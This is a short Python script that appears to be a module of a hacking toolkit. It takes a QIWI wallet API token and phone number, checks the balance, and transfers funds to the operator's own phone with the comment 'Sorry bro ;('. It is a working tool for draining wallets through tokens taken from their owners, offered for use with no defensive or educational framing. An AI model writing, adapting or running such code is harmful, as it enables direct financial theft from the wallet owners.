#!/usr/bin/env python3

from core.colors import *
from SimpleQIWI import *

def viv():
	try:
		tok  = input(B+"\n[#]"+W+" Enter token: ")
		pho  = input(B+"[#]"+W+" Enter phone: ")
		pho2 = input(B+"[#]"+W+" Enter your phone: ")
		amou = int(input(B+"[#]"+W+" Enter amount: "))
		api  = QApi(token=tok, phone=pho)
		if api.balance != 0:
			print(G+"[+]"+W+" Balance Founded")
			print(G+"[+]"+W+" Balance =", api.balance)
			api.pay(account=pho2, amount=amou, comment="Sorry bro ;(")
			print(G+"[+]"+W+" Balance =", api.balance)
	except:
		print(R+"[X]"+W+" Unable to send money. Balance not found")
		pass